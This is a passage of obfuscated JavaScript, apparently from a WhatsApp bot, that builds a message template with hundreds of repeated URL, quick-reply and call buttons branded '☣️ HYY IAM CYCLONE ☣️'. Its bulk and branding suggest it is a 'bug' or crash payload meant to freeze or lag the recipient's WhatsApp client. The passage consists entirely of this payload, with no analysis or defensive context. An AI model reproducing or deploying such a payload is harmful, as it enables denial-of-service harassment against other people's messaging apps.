M\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'u